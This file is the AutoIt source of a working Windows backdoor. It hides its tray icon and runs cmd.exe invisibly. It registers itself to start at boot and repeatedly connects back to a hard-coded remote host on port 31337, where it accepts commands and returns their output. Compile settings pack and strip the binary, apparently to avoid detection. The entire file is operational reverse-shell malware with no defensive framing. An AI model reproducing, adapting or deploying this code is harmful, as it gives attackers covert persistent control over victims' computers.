#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_Run_Au3Stripper=y
#Au3Stripper_Parameters=/rm /mo /pe
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <AutoItConstants.au3>
#include <String.au3>
#include "_Startup.au3"

Opt("TrayIconHide", 1)

$pid = Run(@ComSpec, "", @SW_HIDE, $STDERR_MERGED + $STDIN_CHILD)
Sleep(1000)

TCPStartup()

;insert more host here
Global $host_list[] = ["ulkka50878ba.lunix4.koding.io"]
Global $port_list[] = [31337]
;

Func send_cmd($pid, $cmd)
	StdinWrite($pid, $cmd & @CRLF)
EndFunc

;https://www.autoitscript.com/forum/topic/119997-stdout-read-from-cmdexe-being-cut-short/ ugly but working
Func read_stdout($iPID)
    Local $output = "", $STD_read = "", $S_Counter = 0
    While 1
        Sleep(10)
        $STD_read = StdoutRead($iPID)
        If $STD_read = "" Then
            $S_Counter += 1
        Else
            $output &=$STD_read
        EndIf
        If $S_Counter > 5 Then ExitLoop
    WEnd
    Return $output
EndFunc

Func connect_back()
	For $i = 0 To UBound($host_list) - 1
		$s = TCPConnect(TCPNameToIP($host_list[$i]), $port_list[$i])
		If not @error Then ExitLoop
	Next
	Return $s
EndFunc

Func socket_readline($sock)
	$data = ""
	$count = 0
	While True
		If $count > 10000 Then
			SetError(1)
			ExitLoop
		EndIf
		$c = TCPRecv($sock, 1)
		If @error Then SetError(1)
		If $c == _HexToString("0a") Then ExitLoop
		$data &= $c
		$count += 1
	WEnd
	Return $data
EndFunc

If Not _StartupRegistry_Exists() Then
	_StartupRegistry_Install()
EndIf

;Main loop
While True
	Do
		$s = connect_back()
	Until $s <> -1
	TCPSend($s, "[Welcome] " & @ComputerName & @CRLF)
	While True
		$cmd = socket_readline($s)
		send_cmd($pid, $cmd)
		TCPSend($s, read_stdout($pid))
		If @error Then
			ProcessClose($pid)
			$pid = Run(@ComSpec, "", @SW_HIDE, $STDERR_MERGED + $STDIN_CHILD)
			ExitLoop
		EndIf
		Sleep(500)
	WEnd
	Sleep(500)
WEnd